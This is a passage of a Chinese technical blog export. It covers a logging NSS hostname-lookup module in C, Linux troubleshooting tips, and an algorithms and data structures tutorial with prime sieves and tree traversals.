<span class="type">char</span> *name,</span><br><span class="line">        <span class="type">int</span> af,</span><br><span class="line">        <span class="keyword">struct</span> hostent *host,</span><br><span class="line">        <span class="type">char</span> *buffer, <span class="type">size_t</span> buflen,</span><br><span class="line">        <span class="type">int</span> *errnop, <span class="type">int</span> *h_errnop,</span><br><span class="line">        <span class="type">int32_t</span> *ttlp,</span><br><span class="line">        <span class="type">char</span> **canonp) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stdout, <span class="string">&quot;_nss_hs_gethostbyname3_r ns hook domain:%s  pid:%d\n&quot;</span>, name, <span class="built_in">getpid</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> NSS_STATUS_NOTFOUND;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">nss_status</span> _nss_hs_gethostbyname2_r(</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *name,</span><br><span class="line">        <span class="type">int</span> af,</span><br><span class="line">        <span class="keyword">struct</span> hostent *host,</span><br><span class="line">        <span class="type">char</span> *buffer, <span class="type">size_t</span> buflen,</span><br><span class="line">        <span class="type">int</span> *errnop, <span class="type">int</span> *h_errnop) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _nss_hs_gethostbyname3_r(</span><br><span class="line">            name,</span><br><span class="line">            af,</span><br><span class="line">            host,</span><br><span class="line">            buffer, buflen,</span><br><span class="line">            errnop, h_errnop,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">nss_status</span> _nss_hs_gethostbyname_r(</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *name,</span><br><span class="line">        <span class="keyword">struct</span> hostent *host,</span><br><span class="line">        <span class="type">char</span> *buffer, <span class="type">size_t</span> buflen,</span><br><span class="line">        <span class="type">int</span> *errnop, <span class="type">int</span> *h_errnop) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _nss_hs_gethostbyname3_r(</span><br><span class="line">            name,</span><br><span class="line">            AF_UNSPEC,</span><br><span class="line">            host,</span><br><span class="line">            buffer, buflen,</span><br><span class="line">            errnop, h_errnop,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _nss_hs_init(<span class="built_in">void</span> (*cb)(<span class="type">size_t</span>, <span class="keyword">struct</span> traced_file*)) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stdout, <span class="string">&quot;_nss_hs_init...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>编译</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC -o libnss_test.so.2 -Wl,-soname,libnss_test.so.2 test_nss.c</span><br></pre></td></tr></table></figure>

<ul>
<li>放到<code>/usr/lib</code>下后，重启要使用<code>gethostbyname</code>的进程就好了</li>
</ul>
<h2 id="4-hosts-dns解析服务"><a href="#4-hosts-dns解析服务" class="headerlink" title="4. hosts dns解析服务"></a>4. hosts dns解析服务</h2><ul>
<li><code>mymachines</code>: 由systemd提供，应该是处理容器类型的dns解析</li>
<li><code>resolve</code>: 由systemd提供，是<code>systemd-resolved.service</code>的处理服务</li>
<li><code>files</code>: 由glibc提供，处理<code>/etc/hosts</code></li>
<li><code>myhostname</code>: 由systemd提供，处理<code>localhost</code>、<code>_gateway</code>、<code>_outbound</code>等域名使用，主要是查本地网卡的一些信息</li>
<li><code>dns</code>: 由glibc提供，处理dns的网络请求使用</li>
</ul>
<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-报错-xxxx-pcieport-0000-00-1c-5-xxxx刷屏，无法关机"><a href="#1-报错-xxxx-pcieport-0000-00-1c-5-xxxx刷屏，无法关机" class="headerlink" title="1. 报错[xxxx] pcieport 0000:00:1c.5 xxxx刷屏，无法关机"></a>1. 报错<code>[xxxx] pcieport 0000:00:1c.5 xxxx</code>刷屏，无法关机</h2><ol>
<li>在<code>/etc/defaults/grub</code>里面修改，在<code>GRUB_CMDLINE_LINUX_DEFAULT=</code>后面追加<code>splash pci=nomsi</code></li>
</ol>
<h2 id="2-报错perl-warning-Falling-back-to-the-standard-locale-C"><a href="#2-报错perl-warning-Falling-back-to-the-standard-locale-C" class="headerlink" title="2. 报错perl: warning: Falling back to the standard locale (&quot;C&quot;)."></a>2. 报错<code>perl: warning: Falling back to the standard locale (&quot;C&quot;).</code></h2><ul>
<li>由于系统设置的语言包，系统不识别，需要安装</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个可以解决不识别 zh_CN.UTF-8</span></span><br><span class="line">sudo apt get install language-pack-zh-hans</span><br></pre></td></tr></table></figure>

<h2 id="3-分辨率怎么调都不行，总是达不到1080"><a href="#3-分辨率怎么调都不行，总是达不到1080" class="headerlink" title="3. 分辨率怎么调都不行，总是达不到1080"></a>3. 分辨率怎么调都不行，总是达不到1080</h2><ul>
<li>可以考虑下是线的问题，被一根VGA线坑了一年的人真诚提醒</li>
</ul>
<h2 id="4-中文乱码"><a href="#4-中文乱码" class="headerlink" title="4. 中文乱码"></a>4. 中文乱码</h2><ul>
<li>部分中文出现乱码很有可能时中文字体没有安装，一般安装<code>wqy-microhei</code>就可以解决</li>
</ul>
<h2 id="5-vmware在linux下偶现虚拟机卡死"><a href="#5-vmware在linux下偶现虚拟机卡死" class="headerlink" title="5. vmware在linux下偶现虚拟机卡死"></a>5. vmware在linux下偶现虚拟机卡死</h2><ul>
<li>可能是内核选项<code>vm.compaction_proactiveness</code>的问题，此参数决定了内核在后台应该压缩内存的力度</li>
<li>参考 <a href="https://communities.vmware.com/t5/VMware-Workstation-Pro/kcompacd0-using-100-CPU-with-VMware-Workstation-16/td-p/2896972">kcompacd0-using-100-CPU-with-VMware-Workstation-16</a> 可以设置<code>sudo sysctl -w vm.compaction_proactiveness=1</code>解决</li>
</ul>
<h2 id="6-调整分区大小导致无法mount分区"><a href="#6-调整分区大小导致无法mount分区" class="headerlink" title="6. 调整分区大小导致无法mount分区"></a>6. 调整分区大小导致无法mount分区</h2><ul>
<li>使用分区管理器调整大小的时候，如果连续调整同时生效，很有可能出现调整失败，原分区也无法mount的情况</li>
<li>报错提示超级块里面的大小和分区表的大小不一致</li>
</ul>
<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><ul>
<li>使用parted命令处理分区，使用resizepart将分区大小调整到原来的大小，和报错里面的一致就基本可以了</li>
</ul>
<h2 id="7-查看机器内存情况"><a href="#7-查看机器内存情况" class="headerlink" title="7. 查看机器内存情况"></a>7. 查看机器内存情况</h2><ul>
<li>下面命令查看几个插槽插了几个内存条</li>
<li>可以看到四个插槽，插了两个DDR4的16G内存，速度<code>3200 MT/s</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; sudo dmidecode | grep -A16 &quot;Memory Device$&quot;</span><br><span class="line">Memory Device</span><br><span class="line">        Array Handle: 0x003B</span><br><span class="line">        Error Information Handle: Not Provided</span><br><span class="line">        Total Width: Unknown</span><br><span class="line">        Data Width: Unknown</span><br><span class="line">        Size: No Module Installed</span><br><span class="line">        Form Factor: Unknown</span><br><span class="line">        Set: None</span><br><span class="line">        Locator: Controller0-ChannelB-DIMM0</span><br><span class="line">        Bank Locator: BANK 1</span><br><span class="line">        Type: Unknown</span><br><span class="line">        Type Detail: None</span><br><span class="line">--</span><br><span class="line">Memory Device</span><br><span class="line">        Array Handle: 0x003B</span><br><span class="line">        Error Information Handle: Not Provided</span><br><span class="line">        Total Width: 64 bits</span><br><span class="line">        Data Width: 64 bits</span><br><span class="line">        Size: 16 GB</span><br><span class="line">        Form Factor: DIMM</span><br><span class="line">        Set: None</span><br><span class="line">        Locator: Controller0-ChannelA-DIMM1</span><br><span class="line">        Bank Locator: BANK 0</span><br><span class="line">        Type: DDR4</span><br><span class="line">        Type Detail: Synchronous</span><br><span class="line">        Speed: 3200 MT/s</span><br><span class="line">--</span><br><span class="line">Memory Device</span><br><span class="line">        Array Handle: 0x003B</span><br><span class="line">        Error Information Handle: Not Provided</span><br><span class="line">        Total Width: Unknown</span><br><span class="line">        Data Width: Unknown</span><br><span class="line">        Size: No Module Installed</span><br><span class="line">        Form Factor: Unknown</span><br><span class="line">        Set: None</span><br><span class="line">        Locator: Controller0-ChannelB-DIMM0</span><br><span class="line">        Bank Locator: BANK 1</span><br><span class="line">        Type: Unknown</span><br><span class="line">        Type Detail: None</span><br><span class="line">--</span><br><span class="line">Memory Device</span><br><span class="line">        Array Handle: 0x003B</span><br><span class="line">        Error Information Handle: Not Provided</span><br><span class="line">        Total Width: 64 bits</span><br><span class="line">        Data Width: 64 bits</span><br><span class="line">        Size: 16 GB</span><br><span class="line">        Form Factor: DIMM</span><br><span class="line">        Set: None</span><br><span class="line">        Locator: Controller0-ChannelB-DIMM1</span><br><span class="line">        Bank Locator: BANK 1</span><br><span class="line">        Type: DDR4</span><br><span class="line">        Type Detail: Synchronous</span><br><span class="line">        Speed: 3200 MT/s</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>算法与数据结构学习</title>
    <url>/blogs/2018-09-18-algorithmStudy/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
<li>算法讲解汇总的网站 <a href="https://oi-wiki.org/">OI wiki</a></li>
</ul>
<h1 id="一、数学知识复习"><a href="#一、数学知识复习" class="headerlink" title="一、数学知识复习"></a>一、数学知识复习</h1><h2 id="对数"><a href="#对数" class="headerlink" title="对数"></a>对数</h2><h3 id="定理-1-1"><a href="#定理-1-1" class="headerlink" title="定理 1.1"></a>定理 1.1</h3><p>$$ log_A{B} &#x3D; \frac{log_C{B}}{log_C{A}} ; C &gt; 0 $$</p>
<h2 id="级数"><a href="#级数" class="headerlink" title="级数"></a>级数</h2><h3 id="几何级数公式"><a href="#几何级数公式" class="headerlink" title="几何级数公式"></a>几何级数公式</h3><p>$$ \sum_{i &#x3D; 0}^{N}2^i &#x3D; 2^{N+1} - 1 $$</p>
<p>$$ \sum_{i &#x3D; 0}^{N}A^i &#x3D; \frac{A^{N+1} - 1}{A - 1} $$</p>
<p>当N趋于$\infty$时，该和趋于$\frac{1}{1-A}$。</p>
<h1 id="二、算法分析"><a href="#二、算法分析" class="headerlink" title="二、算法分析"></a>二、算法分析</h1><h2 id="1-数学基础"><a href="#1-数学基础" class="headerlink" title="1. 数学基础"></a>1. 数学基础</h2><h3 id="1-1-四个定义"><a href="#1-1-四个定义" class="headerlink" title="1.1. 四个定义"></a>1.1. 四个定义</h3><ul>
<li>如果存在正常数 $c$ 和 $n_0$ 使得当 $N \geq n_0$ 时 $T(N) \leq cf(N)$ ，则即为 $T(N) &#x3D; O(f(N))$ 。</li>
<li>如果存在正常数 $c$ 和 $n_0$ 使得当 $N \geq n_0$ 时 $T(N) \geq cg(N)$ ，则即为 $T(N) &#x3D; \Omega(f(N))$ 。</li>
<li>$T(N) &#x3D; \Theta (h(N))$ 当且仅当 $T(N) &#x3D; O(h(N))$ 且 $T(N) &#x3D; \Omega(h(N))$ 。</li>
<li>如果 $T(N) &#x3D; O(p(N))$ 且 $T(N) \neq \Theta(p(N))$ ，则 $T(N) &#x3D; o(p(N))$</li>
</ul>
<h2 id="2-排列组合"><a href="#2-排列组合" class="headerlink" title="2. 排列组合"></a>2. 排列组合</h2><h3 id="2-1-公式记录"><a href="#2-1-公式记录" class="headerlink" title="2.1. 公式记录"></a>2.1. 公式记录</h3><ul>
<li>n个不同元素取m个，关心顺序。为排列，使用A表示</li>
</ul>
<p>$$ A_n^m &#x3D; \frac{n!}{(n-m)!} $$</p>
<ul>
<li>n个不同元素取m个，不关心顺序。为组合，使用C表示<ul>
<li>排列的方式除以顺序造成的多余方案数</li>
</ul>
</li>
</ul>
<p>$$ C_n^m &#x3D; \frac{A_n^m}{m!} &#x3D; \frac{n!}{m!(n-m)!} $$<br>$$ C_n^m &#x3D; C_n^{n-m} $$</p>
<h2 id="3-质数"><a href="#3-质数" class="headerlink" title="3. 质数"></a>3. 质数</h2><p>使用欧拉线性筛计算出来的 $10^n$ 以内的质数的数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10 4</span><br><span class="line">100 25</span><br><span class="line">1000 168</span><br><span class="line">10000 1229</span><br><span class="line">100000 9592</span><br><span class="line">1000000 78498</span><br><span class="line">10000000 664579</span><br><span class="line">100000000 5761455</span><br></pre></td></tr></table></figure>

<h3 id="3-1-埃氏筛"><a href="#3-1-埃氏筛" class="headerlink" title="3.1. 埃氏筛"></a>3.1. 埃氏筛</h3><ul>
<li>埃氏筛是将一个合数分成一个质数乘以一个整数，那么循环所有的数，将他们乘以小于自己的质数，得到的结果一定不是质数</li>
<li>那么循环到某个数时，如果其没有被小于自己的数排掉，那么一定是质数</li>
</ul>
<h4 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h4><ul>
<li>反证法，如果有一个合数x没有被排掉，可以分为 $x &#x3D; a \times b，a为因数中最小的质数$</li>
<li>b为合数一定大于a，因为b也可以分为质因数相乘，a为其中最小的；b为质数同样大于a</li>
<li>在循环到b时，乘以小于自己的所有质数，到a时一定会把x排除掉，假设不成立，证明是可行的</li>
</ul>
<h3 id="3-2-欧拉线性筛：使用O-n-的时间复杂度找出n以内的所有质数"><a href="#3-2-欧拉线性筛：使用O-n-的时间复杂度找出n以内的所有质数" class="headerlink" title="3.2. 欧拉线性筛：使用O(n)的时间复杂度找出n以内的所有质数"></a>3.2. 欧拉线性筛：使用O(n)的时间复杂度找出n以内的所有质数</h3><ul>
<li>核心思想是埃氏筛，但是使用一个提前退出将时间复杂度降到O(n)</li>
<li>当一个合数 $x &#x3D; a \times b$，其中b为a的倍数，a为质数，遍历到x时提前退出的唯一顾虑是 $n &#x3D; x \times c &#x3D; a \times b \times c，c为质数$ 没有做排除</li>
<li>当遍历到 $b \times c$ 时，会将n进行排除，所以此顾虑消失，提前退出减少循环计算次数</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mx <span class="type">int</span> = <span class="number">1e8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> primes []<span class="type">int</span> = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, <span class="number">5</span>*<span class="number">1e7</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag := <span class="built_in">make</span>([]<span class="type">bool</span>, mx+<span class="number">1</span>) <span class="comment">// 标记数有没有被筛掉，false就是没有</span></span><br><span class="line">	check := <span class="number">10</span>                <span class="comment">// 打印使用</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">2</span>; i &lt; mx+<span class="number">1</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> !flag[i] &#123;</span><br><span class="line">			<span class="comment">// 数没有被比自己小的数筛掉，就代表是质数</span></span><br><span class="line">			primes = <span class="built_in">append</span>(primes, i)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> _, v := <span class="keyword">range</span> primes &#123;</span><br><span class="line">			<span class="keyword">if</span> i*v &gt; mx &#123;</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 每一个数都作为因子乘以比自己小的素数筛掉后面的数</span></span><br><span class="line">			flag[i*v] = <span class="literal">true</span></span><br><span class="line">			<span class="keyword">if</span> i%v == <span class="number">0</span> &#123;</span><br><span class="line">				<span class="comment">// 减少时间复杂度的关键算法</span></span><br><span class="line">				<span class="comment">// 12 = 2 * 3 * 2，i = 4时，只排了8就退出了，因为6会将12排除</span></span><br><span class="line">				<span class="comment">// 也就是，假设v可以整除i即i = kv，有某个数为x = mi = kmv</span></span><br><span class="line">				<span class="comment">//        那么存在一个数 i &lt; km &lt; x可以把x排掉，用i乘以所有的质数去排除就没什么意义了，提前退出减少时间复杂度</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 仅打印使用</span></span><br><span class="line">		<span class="keyword">if</span> i == check &#123;</span><br><span class="line">			fmt.Println(i, <span class="built_in">len</span>(primes))</span><br><span class="line">			check *= <span class="number">10</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="三、数据结构"><a href="#三、数据结构" class="headerlink" title="三、数据结构"></a>三、数据结构</h1><h2 id="1-树"><a href="#1-树" class="headerlink" title="1. 树"></a>1. 树</h2><h3 id="1-1-公共部分"><a href="#1-1-公共部分" class="headerlink" title="1.1. 公共部分"></a>1.1. 公共部分</h3><h4 id="1-遍历"><a href="#1-遍历" class="headerlink" title="1) 遍历"></a>1) 遍历</h4><h5 id="1-树的深度优先和广度优先遍历"><a href="#1-树的深度优先和广度优先遍历" class="headerlink" title="(1) 树的深度优先和广度优先遍历"></a>(1) <span id = "treeSpan">树的深度优先和广度优先遍历</span></h5><p>定义树结构</p>
<img src = "2019_02_27_10.png" width = "40%">

<h6 id="深度优先遍历"><a href="#深度优先遍历" class="headerlink" title="深度优先遍历"></a>深度优先遍历</h6><p>深度优先遍历（Depth First Search），简称DFS，其原则是，沿着一条路径一直找到最深的那个节点，当没有子节点的时候，返回上一级节点，寻找其另外的子节点，继续向下遍历，没有就向上返回一级，直到所有的节点都被遍历到，每个节点只能访问一次。</p>
<p><strong>算法步骤：</strong></p>
<p>使用栈的数据结构实现</p>
<ol>
<li>首先将根节点1压入栈中【1】</li>
<li>将1节点弹出，找到1的两个子节点3，2，首先压入3节点，再压入2节点（后压入左节点的话，会先取出左节点，这样就保证了先遍历左节点），2节点再栈的顶部，最先出来【2，3】</li>
<li>弹出2节点，将2节点的两个子节点5，4压入【4，5，3】</li>
<li>弹出4节点，将4的子节点9，8压入【8，9，5，3】</li>
<li>弹出8，8没有子节点，不压入【9，5，3】</li>
<li>弹出9，9没有子节点，不压入【5，3】</li>
<li>弹出5，5有一个节点，压入10，【10，3】</li>
<li>弹出10，10没有节点，不压入【3】</li>
<li>弹出3，压入3的子节点7，6【6，7】</li>
<li>弹出6，没有子节点【7】</li>
<li>弹出7，没有子节点，栈为空【】，算法结束</li>
</ol>
<p>出栈顺序【1，2，4，8，9，5，10，3，6，7】</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//树结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    vector&lt;shared_ptr&lt;Node&gt;&gt; pChild;</span><br><span class="line">    weak_ptr&lt;Node&gt; pParent;</span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//深度优先打印节点</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printNodesDeepFirst</span><span class="params">(<span class="type">const</span> shared_ptr&lt;Node&gt; &amp;node)</span> </span>&#123;</span><br><span class="line">    stack&lt;shared_ptr&lt;Node&gt;&gt; myStack;</span><br><span class="line">    myStack.<span class="built_in">push</span>(node);</span><br><span class="line">    <span class="keyword">while</span> (myStack.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        shared_ptr&lt;Node&gt; pTmp = myStack.<span class="built_in">top</span>();</span><br><span class="line">        myStack.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="built_in">PRINT</span>(<span class="string">&quot;%d &quot;</span>, pTmp-&gt;value);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//由于栈的后进先出特性，需要倒序使左节点先出</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = pTmp-&gt;pChild.<span class="built_in">size</span>(); i != <span class="number">0</span>; --i) &#123;</span><br><span class="line">            myStack.<span class="built_in">push</span>(pTmp-&gt;pChild[i - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">PRINT</span>(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="广度优先遍历"><a href="#广度优先遍历" class="headerlink" title="广度优先遍历"></a>广度优先遍历</h6><p>广度优先遍历（Breadth First Search），简称BFS；广度优先遍历的原则就是对每一层的节点依次访问，一层访问结束后，进入下一层，直到最后一个节点，同样的，每个节点都只访问一次。</p>
<p><strong>算法步骤：</strong></p>
<p>使用队列的数据结构实现</p>
<ol>
<li>节点1，插入队列【1】</li>
<li>取出节点1，插入1的子节点2，3 ，节点2在队列的前端【2，3】</li>
<li>取出节点2，插入2的子节点4，5，节点3在队列的最前端【3，4，5】</li>
<li>取出节点3，插入3的子节点6，7，节点4在队列的最前端【4，5，6，7】</li>
<li>取出节点4，插入3的子节点8，9，节点5在队列的最前端【5，6，7，8，9】</li>
<li>取出节点5，插入5的子节点10，节点6在队列的最前端【6，7，8，9，10】</li>
<li>取出节点6，没有子节点，不插入，节点7在队列的最前端【7，8，9，10】</li>
<li>取出节点7，没有子节点，不插入，节点8在队列的最前端【8，9，10】</li>
<li>取出节点8，没有子节点，不插入，节点9在队列的最前端【9，10】</li>
<li>取出节点9，没有子节点，不插入，节点10在队列的最前端【10】</li>
<li>取出节点10，队列为空，算法结束</li>
</ol>
<p>我们看一下节点出队的顺序【1，2，3，4，5，6，7，8，9，10】</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//树结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    vector&lt;shared_ptr&lt;Node&gt;&gt; pChild;</span><br><span class="line">    weak_ptr&lt;Node&gt; pParent;</span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line"><span class="comment">//广度优先打印节点</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printNodesWidthFirst</span><span class="params">(<span class="type">const</span> shared_ptr&lt;Node&gt; &amp;node)</span> </span>&#123;</span><br><span class="line">    queue&lt;shared_ptr&lt;Node&gt;&gt; myQueue;</span><br><span class="line">    myQueue.<span class="built_in">push</span>(node);</span><br><span class="line">    <span class="keyword">while</span> (myQueue.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        shared_ptr&lt;Node&gt; pTmp = myQueue.<span class="built_in">front</span>();</span><br><span class="line">        myQueue.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="built_in">PRINT</span>(<span class="string">&quot;%d &quot;</span>, pTmp-&gt;value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> tmp : pTmp-&gt;pChild) &#123;</span><br><span class="line">            myQueue.<span class="built_in">push</span>(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">PRINT</span>(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-度"><a href="#2-度" class="headerlink" title="2) 度"></a>2) 度</h4><ul>
<li>孩子结点个数就是结点的度，0度就是没有孩子结点</li>
<li>树的度就是结点中最大的度</li>
</ul>
<h3 id="1-2-二叉树"><a href="#1-2-二叉树" class="headerlink" title="1.2. 二叉树"></a>1.2. 二叉树</h3><h4 id="1-性质和算法"><a href="#1-性质和算法" class="headerlink" title="1) 性质和算法"></a>1) 性质和算法</h4><h5 id="1-二叉树前中后序遍历"><a href="#1-二叉树前中后序遍历" class="headerlink" title="(1) 二叉树前中后序遍历"></a>(1) <span id = "towTree">二叉树前中后序遍历</span></h5><ul>
<li>前序遍历指先访问根，然后访问子树的遍历方式</li>
</ul>
<img src = "2019_02_22_05.png" width = "40%">

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">in_order_traversal</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Do Something with root</span></span><br><span class="line">    <span class="keyword">if</span> (root-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">in_order_traversal</span>(root-&gt;lchild);</span><br><span class="line">    <span class="keyword">if</span> (root-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">in_order_traversal</span>(root-&gt;rchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>中序遍历指先访问左（右）子树，然后访问根，最后访问右（左）子树的遍历方式</li>
</ul>
<img src = "2019_02_22_06.png" width = "40%">

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">in_order_traversal</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">in_order_traversal</span>(root-&gt;lchild);</span><br><span class="line">    <span class="comment">// Do Something with root</span></span><br><span class="line">    <span class="keyword">if</span> (root-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">in_order_traversal</span>(root-&gt;rchild);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>后序遍历指先访问子树，然后访问根的遍历方式</li>
</ul>
<img src = "2019_02_22_07.png" width = "40%">

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">in_order_traversal</span><span class="params">(TreeNode *root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root-&gt;lchild != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">in_order_traversal</span>(root-&gt;lchild);</span><br><span class="line">    <span class="keyword">if</span> (root-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">in_order_traversal</span>(root-&gt;rchild);</span><br><span class="line">    <span class="comment">// Do Something with root</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-完全二叉树和满二叉树"><a href="#2-完全二叉树和满二叉树" class="headerlink" title="(2) 完全二叉树和满二叉树"></a>(2) 完全二叉树和满二叉树</h5><ul>
<li>满二叉树，只有最后一行是叶子节点，其他的节点都是度为2的节点</li>
<li>完全二叉树指的是除了最后一行，整体是满二叉树，最后一行叶子节点从左到右依次排列</li>
</ul>
<h4 id="2-二叉搜索树"><a href="#2-二叉搜索树" class="headerlink" title="2) 二叉搜索树"></a>2) 二叉搜索树</h4><p>二叉查找树（Binary Search Tree），（又：二叉搜索树，二叉排序树）它或者是一棵空树，或者是具有下列性质的二叉树：<br><strong>若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值； 若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值；</strong><br>它的左、右子树也分别为二叉排序树。</p>
<h5 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h5><p>二叉排序树的查找过程和次优二叉树类似，通常采取二叉链表作为二叉排序树的存储结构。<strong>中序遍历</strong>二叉排序树可得到一个关键字的有序序列，一个无序序列可以通过构造一棵二叉排序树变成一个有序序列，构造树的过程即为对无序序列进行排序的过程。每次插入的新的结点都是二叉排序树上新的叶子结点，在进行插入操作时，不必移动其它结点，只需改动某个结点的指针，由空变为非空即可。搜索,插入,删除的复杂度等于树高，O(log(n)).</p>
<h4 id="3-大（小）根堆（优先队列）"><a href="#3-大（小）根堆（优先队列）" class="headerlink" title="3) 大（小）根堆（优先队列）"></a>3) 大（小）根堆（优先队列）</h4><p>大（小）根堆是堆的两种形式之一。根结点（亦称为堆顶）的关键字是堆里所有结点关键字中最大（小）者，称为大（小）根堆，又称最大（小）堆、大（小）顶堆。大（小）根堆要求根节点的关键字既大（小）于或等于左子树的关键字值，又大（小）于或等于右子树的关键字值。<br>普通的队列是一种先进先出的数据结构，元素在队列尾追加，而从队列头删除。在优先队列中，元素被赋予优先级。当访问元素时，具有最高优先级的元素最先删除。优先队列具有最高级先出 （first in, largest out）的行为特征。通常采用堆数据结构来实现。</p>
<h5 id="性质和应用"><a href="#性质和应用" class="headerlink" title="性质和应用"></a>性质和应用</h5><ul>
<li>最大或最小值在堆顶，可以用于排序数组</li>
<li>可以用队列表示，第$i$个元素大于或者小于第$i * 2$和第$i * 2 + 1$个元素</li>
<li>最基本的应用，查找<a href="/blogs/2019-10-21-programQuestion/#minKNumber">数组最小（大）k个值</a></li>
